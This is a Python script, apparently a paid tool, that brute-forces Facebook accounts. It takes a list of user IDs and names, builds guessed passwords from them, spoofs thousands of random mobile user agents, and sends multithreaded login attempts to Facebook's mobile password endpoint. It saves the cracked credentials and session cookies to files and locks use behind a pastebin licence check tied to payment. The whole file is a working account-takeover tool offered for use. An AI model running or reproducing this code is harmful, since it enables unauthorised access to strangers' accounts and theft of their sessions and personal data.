import os
import requests
import random
import sys
import re
import time
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import uuid
import json
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('git pull')

pcp = []
loop = 0
oks = []
cps = []
id = []
GA=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android 4.1.2;'
        b=random.choice(['6','7','8','9','10','11','12',])
        c=f'zh-CN; HUAWEI A199 Build/HuaweiA199)'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
        h=random.randrange(73,100)
        i='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/316.0.0.54.116;]'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        GA.append(uaku2)
GA=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
        b=random.choice(['6','7','8','9','10','11','12',])
        c=f' TL-tl;'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        GA.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 9; Nokia C2 Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        GA.append(fullagnt)        
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        GA.append(fullagnt)  
os.system('clear')
logo ="""███    ███ ██   ██ ██████  
████  ████ ██   ██ ██   ██ 
██ ████ ██ ███████ ██████  
██  ██  ██ ██   ██ ██   ██ 
██      ██ ██   ██ ██████  
\033[1;37m--------------------------
[~] Author   : MHB
[~] Facebook : MHB
[~] Tool     : PAID
[~] Version  : 1-0
\033[1;37m--------------------------"""       
def clear():
        os.system('clear')
        print(logo)
def linex():
        print('\033[1;37m--------------------------')
def ze():
        try:
                clear()
                x = ("sex")
                if x == ("sex"):
                        print('[1] File Cloning')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                #print('Put file example:  /sdcard/File.txt  etc..')
                                #linex()
                                file = input('Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('File location not found ')
                                        time.sleep(1)
                                        ze()
                                clear()
                                #print(' All method working try 1 by 1 ')
                                linex()
                                print(' [1] Method 1 \n [2] Method 2')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('Total account:\033[1;37m'+total_ids+f'')
                                        print("\033[1;37mIDS NOT COMING USE FLIGHT MODE\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                crack_submit.submit(ffb,ids,names,passlist)                                                 
                                print('\033[1;32m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python MUNA.py')
        except:
                pass
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r%s|OK|%s '%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        aaa=random.choice(GA)
                        head = {'Host':'m.facebook.com','content-length':'27770','sec-ch-ua':'" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"','x_fb_background_state':'1','sec-ch-ua-mobile':'?0','user-agent':aaa,'x-asbd-id':'198387','sec-ch-ua-platform':'"Linux"','accept':'*/*','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://m.facebook.com/home.php?wtsid=rdr_0uvIdJpXzYGfl9ECz&hrc=1&paipv=0&eav=AfYuQMZUmGEgS2trmt8d6BjXOQ4x4Lb-Ct3_9h6c1XqV8SH3crDKaSTzhlIetgU6wq8&_rdr','accept-encoding':'gzip, deflate, br','accept-language':'en-US,en;q=0.9',}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        dc=dict(session.cookies)
                        coki=";".join([k+"="+v for k,v in dc.items()])
                        if "c_user" in session.cookies.get_dict():
                                print('\r\r\033[1;32m[OK] %s|%s'%(ids,pas))
                                open('/sdcard/ok.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/MUNA-COKE.txt', 'a').write(coki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in session.cookies.get_dict():
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m[CP] '+ids+'|'+pas+'\033[1;97m')
                                        open('/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1                
def menu_apikey():
  mhb = str(os.geteuid()) + str(os.getlogin())
  id = "a".join(mhb)
  server = requests.get('https://pastebin.com/raw/FxecR5Vh').text
  os.system(" clear")  
  print("""███    ███ ██   ██ ██████  
████  ████ ██   ██ ██   ██ 
██ ████ ██ ███████ ██████  
██  ██  ██ ██   ██ ██   ██ 
██      ██ ██   ██ ██████  
\033[1;37m--------------------------
[~] Author   : ZHB
[~] Facebook : MHB
[~] Tool     : PAID
[~] Version  : 1-0
[~] \033[1;32mPAK USER 03403233915 JAZZ CASH\033[1;37m
[~]\033[1;32m]MIX CONTRY BINNACE  UID 742599258\033[1;37m
\033[1;37m--------------------------""")                  
  print("\t \033[1;37mFIRST GET APPROVEL\033[1;37m ")
  print(" \033[1;37mTHIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print("\x1b[1;97mcontact Admin to Buy this Tools");time.sleep (0.1) 
  print("\033[1;37 KEY:"+id)
  print("\033[1;37mCOPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print("SEND KEY ON ADMIN WHATSAPP  ");time.sleep(1)
  os.system('xdg-open https://wa.me/+923273988991')
  print("");time.sleep(2)
  print("\x1b[1;97mCHECKING YOUR APROVAL    ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://pastebin.com/raw/FxecR5Vh").text
    if id in httpCaht:
      print("\033[1;97mYOUR TOKEN APROVED");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      print("\x1b[1;97mSorry Bro Token Key not Aproved“")
      print("Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+923273988991')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if ___name___ == '__main__':
    	print(logo)
    	menu_apikey()
menu_apikey() 
def tnx():
  mhb = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(mhb)
  server = requests.get('https://pastebin.com/raw/FxecR5Vh').text
  os.system(" clear ")
  print(logo)
  print(" Wait bro,,,, ")
  print("Chacking Your Aproval ")
  print("\x1b[1;97mCHECKING YOUR APROVAL            ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://pastebin.com/raw/FxecR5Vh").text
    if id in httpCaht:
      print("\033[1;97mYOUR TOKEN APROVED");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      print("\x1b[1;97mSorry Bro Your Token not Aproved")
      print("Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+923273988991')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if ___name___ == '__main__':
          print(logo)
          ze()
try:
      ze()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()